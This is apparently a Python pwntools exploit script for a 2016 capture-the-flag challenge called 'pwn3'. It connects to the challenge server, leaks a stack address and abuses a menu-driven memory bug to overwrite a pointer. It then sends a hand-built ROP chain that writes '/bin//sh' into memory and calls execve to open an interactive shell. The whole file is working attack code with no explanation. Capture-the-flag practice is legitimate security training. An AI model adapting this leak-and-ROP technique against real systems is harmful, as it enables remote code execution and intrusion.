from pwn import *
from struct import pack
#p=process('./pwn3')
p=remote('problems2.2016q1.sctf.io','1339')
p.recv()
#add 2 posts
p.sendline('1')
p.recv()
p.sendline('a')
p.recv()
p.sendline('b')
p.recv()
p.sendline('c')
p.recv()
p.sendline('3')
p.recvuntil('0x')
ptr=int(p.recvuntil('\n')[:-1],16)
ptr_ret=ptr+0x911c+2
print '[*] stack pointer:'+hex(ptr)
print '[*] ret pointer:'+hex(ptr_ret)
p.sendline('1')
p.recv()
p.sendline('d')
p.recv()
p.sendline('e')
p.recv()
p.sendline('f')
p.recv()
#now overwrite the second post ptr
p.sendline('2')
p.recv()
p.sendline('0')
p.recv()
#prepare payload
payload=''
payload += pack('<I', 0x0806f4ea) # pop edx ; ret
payload += pack('<I', 0x080eb060) # @ .data
payload += pack('<I', 0x080bb926) # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x0806f4ea) # pop edx ; ret
payload += pack('<I', 0x080eb064) # @ .data + 4
payload += pack('<I', 0x080bb926) # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x0806f4ea) # pop edx ; ret
payload += pack('<I', 0x080eb068) # @ .data + 8
payload += pack('<I', 0x08054f10) # xor eax, eax ; ret
payload += pack('<I', 0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x080481c9) # pop ebx ; ret
payload += pack('<I', 0x080eb060) # @ .data
payload += pack('<I', 0x0806f511) # pop ecx ; pop ebx ; ret
payload += pack('<I', 0x080eb068) # @ .data + 8
payload += pack('<I', 0x080eb060) # padding without overwrite ebx
payload += pack('<I', 0x0806f4ea) # pop edx ; ret
payload += pack('<I', 0x080eb068) # @ .data + 8
payload += pack('<I', 0x08054f10) # xor eax, eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x0807bf4f) # inc eax ; ret
payload += pack('<I', 0x080499c1) # int 0x80
p.sendline('a'+p32(0)+p32(ptr_ret-101-4)+'\x01')
p.recv()
p.sendline('2')
p.recv()
p.sendline('8')
p.recv()
p.sendline(p32(0)+payload)
p.recv()
#spawn a shell!!!
p.sendline('5')
p.interactive()

